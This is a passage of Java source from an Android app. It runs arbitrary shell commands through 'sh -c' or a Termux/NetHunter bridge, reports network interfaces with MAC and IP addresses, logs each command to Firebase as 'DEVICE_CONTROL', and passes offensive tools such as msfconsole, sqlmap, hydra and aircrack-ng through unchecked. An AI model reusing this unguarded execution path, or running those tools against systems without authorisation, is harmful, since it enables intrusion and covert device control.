                if (!trimmedCmd.contains("-n")) {
                    execCmd = execCmd + " -n 1 -b";
                }
            } else if (trimmedCmd.startsWith("ping ")) {
                if (!trimmedCmd.contains("-c")) {
                    execCmd = execCmd + " -c 4";
                }
            }

            return executeShellProcess(execCmd);
        } catch (Exception e) {
            return "Shell Error: " + e.getMessage();
        }
    }

    private String executeShellProcess(String command) {
        try {
            File workingDir = new File(currentShellPath);
            if (!workingDir.exists() || !workingDir.isDirectory()) {
                File sdcard = Environment.getExternalStorageDirectory();
                if (sdcard != null && sdcard.exists()) {
                    currentShellPath = sdcard.getCanonicalPath();
                } else {
                    currentShellPath = context.getFilesDir().getCanonicalPath();
                }
                workingDir = new File(currentShellPath);
            }

            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
            pb.directory(workingDir);
            pb.redirectErrorStream(true);

            Process process = pb.start();

            final StringBuilder output = new StringBuilder();
            final boolean[] truncated = new boolean[]{false};

            Thread readerThread = new Thread(() -> {
                try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
                    String line;
                    int count = 0;
                    while ((line = reader.readLine()) != null) {
                        if (count < 500) {
                            output.append(line).append("\n");
                            count++;
                        } else {
                            truncated[0] = true;
                            break;
                        }
                    }
                } catch (Exception ignored) {}
            });
            readerThread.start();

            final boolean[] finished = new boolean[]{false};
            Thread processWaitThread = new Thread(() -> {
                try {
                    process.waitFor();
                    finished[0] = true;
                } catch (InterruptedException ignored) {}
            });
            processWaitThread.start();

            try {
                processWaitThread.join(10000);
            } catch (InterruptedException ignored) {}

            if (!finished[0]) {
                try {
                    process.destroy();
                } catch (Exception ignored) {}
                processWaitThread.interrupt();
                readerThread.interrupt();
                if (output.length() == 0) {
                    output.append("[Command execution timed out after 10 seconds]");
                } else {
                    output.append("\n[Command execution timed out - output truncated]");
                }
            } else {
                try {
                    readerThread.join(1000);
                } catch (InterruptedException ignored) {}
            }

            if (truncated[0]) {
                output.append("\n[Output truncated at 500 lines]");
            }

            String result = output.toString().trim();
            if (result.isEmpty()) {
                return "[Command executed with no output]";
            }

            FirebaseConfig.logActivity("DEVICE_CONTROL: Shell command executed - " + command);
            return result;
        } catch (Exception e) {
            return "Shell Error: " + e.getMessage();
        }
    }

    private String executeTermuxDirectFallback(String command) {
        try {
            File termuxBin = new File("/data/data/com.termux/files/usr/bin/bash");
            String shPath = termuxBin.exists() ? termuxBin.getAbsolutePath() : "sh";
            
            ProcessBuilder pb = new ProcessBuilder(shPath, "-c", command);
            Map<String, String> env = pb.environment();
            String currentPath = env.get("PATH");
            env.put("PATH", "/data/data/com.termux/files/usr/bin:/data/data/com.termux/files/usr/bin/applets" + (currentPath != null ? ":" + currentPath : ""));
            env.put("HOME", "/data/data/com.termux/files/home");
            env.put("PREFIX", "/data/data/com.termux/files/usr");
            env.put("LD_LIBRARY_PATH", "/data/data/com.termux/files/usr/lib");
            env.put("DEBIAN_FRONTEND", "noninteractive");
            
            File homeDir = new File("/data/data/com.termux/files/home");
            if (homeDir.exists()) {
                pb.directory(homeDir);
            }
            
            Process process = pb.start();
            
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            byte[] buffer = new byte[8192];
            int len;
            try (java.io.InputStream is = process.getInputStream()) {
                while ((len = is.read(buffer)) != -1) {
                    baos.write(buffer, 0, len);
                }
            }
            try (java.io.InputStream es = process.getErrorStream()) {
                while ((len = es.read(buffer)) != -1) {
                    baos.write(buffer, 0, len);
                }
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                process.waitFor(30, java.util.concurrent.TimeUnit.SECONDS);
            } else {
                process.waitFor();
            }
            String output = baos.toString("UTF-8").trim();
            if (output.isEmpty()) {
                return "Termux Execution Notice:\n\n" +
                       "If Termux commands time out or fail, ensure:\n" +
                       "  1. Termux has **Storage permission** granted in Android App Settings (to write output files).\n" +
                       "  2. `allow-external-apps = true` is set in `~/.termux/termux.properties` (followed by `termux-reload-settings`).";
            }
            return output + "\n\n[Termux Direct Bridge Execution Complete]";
        } catch (Exception e) {
            return "Termux Bridge Error: " + e.getMessage() + "\n\n" +
                   "Ensure Termux has Storage permission in Android Settings and `allow-external-apps = true` is enabled in `~/.termux/termux.properties`.";
        }
    }

    private String getNetworkInterfaceConfig() {
        StringBuilder sb = new StringBuilder("IP_CONFIGURATION:\n\n");
        try {
            java.util.Enumeration<java.net.NetworkInterface> interfaces = java.net.NetworkInterface.getNetworkInterfaces();
            if (interfaces == null || !interfaces.hasMoreElements()) {
                return "Error: No network interfaces found.";
            }
            while (interfaces.hasMoreElements()) {
                java.net.NetworkInterface netIf = interfaces.nextElement();
                sb.append("  ").append(netIf.getName()).append(": ");
                
                List<String> flags = new ArrayList<>();
                try { if (netIf.isUp()) flags.add("UP"); } catch (Exception ignored) {}
                try { if (netIf.isLoopback()) flags.add("LOOPBACK"); } catch (Exception ignored) {}
                try { if (netIf.isPointToPoint()) flags.add("POINTTOPOINT"); } catch (Exception ignored) {}
                try { if (netIf.supportsMulticast()) flags.add("MULTICAST"); } catch (Exception ignored) {}
                if (!flags.isEmpty()) {
                    sb.append("[").append(android.text.TextUtils.join(", ", flags)).append("]");
                }
                sb.append("\n");

                try {
                    byte[] mac = netIf.getHardwareAddress();
                    if (mac != null && mac.length > 0) {
                        StringBuilder macStr = new StringBuilder();
                        for (int i = 0; i < mac.length; i++) {
                            macStr.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));
                        }
                        sb.append("    MAC: ").append(macStr).append("\n");
                    }
                } catch (Exception ignored) {}

                java.util.Enumeration<java.net.InetAddress> addrs = netIf.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    java.net.InetAddress addr = addrs.nextElement();
                    if (addr instanceof java.net.Inet4Address) {
                        sb.append("    IPv4: ").append(addr.getHostAddress()).append("\n");
                    } else if (addr instanceof java.net.Inet6Address) {
                        String host = addr.getHostAddress();
                        if (host != null) {
                            int ip6Idx = host.indexOf('%');
                            if (ip6Idx > 0) host = host.substring(0, ip6Idx);
                            sb.append("    IPv6: ").append(host).append("\n");
                        }
                    }
                }
                sb.append("\n");
            }
            return sb.toString().trim();
        } catch (Exception e) {
            return "Error retrieving network configuration: " + e.getMessage();
        }
    }

    private String resolveTermuxPath(String cmd) {
        if (cmd == null) return "";
        String trimmed = cmd.trim();
        if (trimmed.equals("apt") || trimmed.startsWith("apt ")) {
            return "apt-get" + (trimmed.length() > 3 ? trimmed.substring(3) : "");
        } else if (trimmed.equals("pkg") || trimmed.startsWith("pkg ")) {
            if (trimmed.equalsIgnoreCase("pkg list-installed") || trimmed.equalsIgnoreCase("pkg list")) {
                return "dpkg -l";
            }
            return "apt-get" + (trimmed.length() > 3 ? trimmed.substring(3) : "");
        } else if (trimmed.equals("dpkg") || trimmed.startsWith("dpkg ")) {
            return trimmed;
        } else if (trimmed.equals("pip") || trimmed.startsWith("pip ")) {
            return trimmed;
        } else if (trimmed.equals("python") || trimmed.startsWith("python ")) {
            return trimmed;
        } else if (trimmed.equals("nh") || trimmed.equals("nethunter") || trimmed.equals("nh -s")) {
            return "echo 'NetHunter Terminal Bridge Active. Run tools directly (dpkg -l, apt-get update, nmap, sqlmap, etc.)'";
        } else if (trimmed.startsWith("nh -c ") || trimmed.startsWith("nethunter -c ")) {
            return trimmed.substring(6).trim();
        } else if (trimmed.startsWith("nh ") || trimmed.startsWith("nethunter ")) {
            return trimmed.substring(trimmed.indexOf(' ')).trim();
        } else if (trimmed.equals("kali")) {
            return "uname -a";
        } else if (trimmed.startsWith("kali ")) {
            return trimmed.substring(5).trim();
        } else if (trimmed.startsWith("msfconsole") || trimmed.startsWith("sqlmap") || trimmed.startsWith("hydra") || trimmed.startsWith("wifite") || trimmed.startsWith("aircrack-ng") || trimmed.startsWith("nmap")) {
            return trimmed;
        }
        return cmd;
    }
}
